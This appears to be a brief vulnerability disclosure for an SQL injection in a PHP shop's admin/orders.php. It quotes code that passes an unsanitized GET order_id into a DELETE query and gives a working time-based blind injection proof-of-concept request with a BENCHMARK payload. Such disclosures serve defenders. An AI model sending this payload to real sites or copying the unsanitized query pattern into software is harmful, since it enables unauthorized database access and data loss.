### Vulnerability file address

`admin/orders.php` from line 5,The $order_id parameter is controllable, the parameter order_id can be passed through get, and the $order_id is not protected from sql injection, resulting in sql injection

```php
if(isset($_GET['action']) && $_GET['action']!="" && $_GET['action']=='delete')
{
$order_id=$_GET['order_id'];

/*this is delet query*/
mysqli_query($con,"delete from orders where order_id='$order_id'")or die("delete query is incorrect...");
} 
```

### POC

```http
GET /admin/orders.php?action=delete&order_id=bbbb' AND 3916=BENCHMARK(5000000,MD5(0x7748556f))-- hdtf HTTP/1.1
Host: www.onsp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=acrlvk4ljcqdujn2orbd09in25
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20220729214016877](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220729214016.png)